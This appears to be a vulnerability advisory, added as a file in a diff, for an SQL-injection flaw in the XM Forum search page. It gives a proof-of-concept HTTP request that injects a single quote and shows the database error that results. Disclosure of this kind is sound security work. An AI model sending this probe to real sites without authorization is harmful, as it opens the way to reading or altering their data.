@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/55299/info
+
+XM Forum is prone to an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+P0C : 
+HTTP HEADERS : 
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://www.example.com/chilli_forum/search.asp
+Cookie: TrackID=%7B54A35316%2D7519%2D405D%2D950A%2DA8CF50497150%7D; ASPSESSIONIDASSRDDBT=LPENAGHCNMNGMAOLEAJFMFOA
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Post Data --------------------
+terms=%27&stype=1&in=1&forum=-1&ndays=0&mname=
+
+Http response : 
+
+28 Microsoft OLE DB Provider for SQL Server 8 21 error ' 8 80040e14 8 ' 1f
+
+84 Unclosed quotation mark after the character string ') ORDER BY tbl_Categories.cOrder, tbl_Forums.fOrder, tbl_Topics.tLastPostDate'. 7 1f 
+
